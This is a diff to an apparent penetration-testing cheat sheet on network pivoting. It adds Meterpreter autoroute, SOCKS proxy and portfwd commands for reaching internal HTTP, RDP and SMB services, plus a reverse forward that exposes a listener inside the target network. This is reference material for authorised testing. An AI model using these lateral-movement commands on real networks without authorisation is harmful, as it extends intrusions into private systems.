@@ -31,11 +31,27 @@ ssh -R 4444:127.0.0.1:4444 user@pivot           # remote: expose your listener i
 # then proxychains via socks5 127.0.0.1 1080
 ```
 
-## Meterpreter autoroute
+## Meterpreter autoroute (best when you already have a Meterpreter session)
 
 ```
-run autoroute -s 172.16.20.0/24
-background ; use auxiliary/server/socks_proxy ; set SRVPORT 1080 ; run
+# From inside the Meterpreter session:
+run autoroute -s 172.16.20.0/24        # add route to internal subnet
+run autoroute -p                        # verify routes
+
+# Then background and set up SOCKS proxy:
+background
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# Port-forward a single service (faster than SOCKS for one target):
+portfwd add -l 8080 -p 80 -r <internal-target>     # access internal:80 at localhost:8080
+portfwd add -l 3389 -p 3389 -r <internal-target>   # RDP
+portfwd add -l 445 -p 445 -r <internal-target>     # SMB for crackmapexec
+
+# Reverse port forward (expose your listener into the internal net):
+portfwd add -R -l 4444 -p 4444 -L 0.0.0.0
 ```
 
 ## Double / triple pivot
